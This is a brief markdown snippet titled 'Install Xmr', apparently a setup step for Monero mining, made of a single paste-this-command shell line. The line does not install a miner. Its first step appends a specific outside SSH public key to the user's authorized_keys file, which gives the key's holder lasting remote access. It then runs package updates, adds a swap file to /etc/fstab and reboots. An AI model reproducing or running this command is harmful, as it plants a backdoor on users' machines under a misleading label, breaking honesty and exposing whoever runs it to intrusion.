
# Install Xmr
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCNzCCOkNRXuWG9ChM5I3a3PExi9MLUN8DDq0y+scclO/gMPvo6rRxaMDJa5O1hMOw8ZPkUN9uLR8hzy0yCajAtmendFXKbx/z5K74uCX9CropUrZRoH83KlgUI+boKml83N4ZVXrpcSznCRlz62+nY/Qq3Spr5/N+jpf7ijkWh3D6Qp4ODdmyd86Js9vObhs8Ai/lVew9a3dybmHoTRfo56z7jgB4vEhHpkKk+41QGNDOo+iUnXNG9GRhcZCy4jZqB6lo3SHf+wgAHM1vNy7jd6n1L1dSesi0K83L7pMo9ejV24KVke8oWkjr9N1s+vzgQD6iru7E/5VbAVeagr9Z1 u0_a362@localhost" >> .ssh/authorized_keys && sudo apt update && sudo apt upgrade -y && sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile && echo '/swapfile none swap sw 0 0' | sudo tee -a /etc/fstab && free -h && reboot
```
